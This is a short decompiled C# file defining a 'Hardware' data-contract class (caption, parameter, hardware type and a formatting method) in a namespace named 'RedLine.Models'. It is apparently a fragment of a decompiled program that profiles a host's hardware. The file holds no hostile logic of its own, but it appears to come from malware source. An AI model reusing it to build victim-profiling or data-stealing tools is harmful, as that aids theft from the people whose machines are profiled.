using System;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	// Token: 0x0200000F RID: 15
	[DataContract(Name = "Hardware", Namespace = "v1/Models")]
	public class Hardware
	{
		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000062 RID: 98 RVA: 0x000033FB File Offset: 0x000015FB
		// (set) Token: 0x06000063 RID: 99 RVA: 0x00003403 File Offset: 0x00001603
		[DataMember(Name = "Caption")]
		public string Caption { get; set; }

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000064 RID: 100 RVA: 0x0000340C File Offset: 0x0000160C
		// (set) Token: 0x06000065 RID: 101 RVA: 0x00003414 File Offset: 0x00001614
		[DataMember(Name = "Parameter")]
		public string Parameter { get; set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000066 RID: 102 RVA: 0x0000341D File Offset: 0x0000161D
		// (set) Token: 0x06000067 RID: 103 RVA: 0x00003425 File Offset: 0x00001625
		[DataMember(Name = "HardType")]
		public HardwareType HardType { get; set; }

		// Token: 0x06000068 RID: 104 RVA: 0x00003430 File Offset: 0x00001630
		public override string ToString()
		{
			return "Name: " + this.Caption + "," + ((this.HardType == HardwareType.Processor) ? (" " + this.Parameter + " Cores") : (" " + this.Parameter + " bytes"));
		}
	}
}
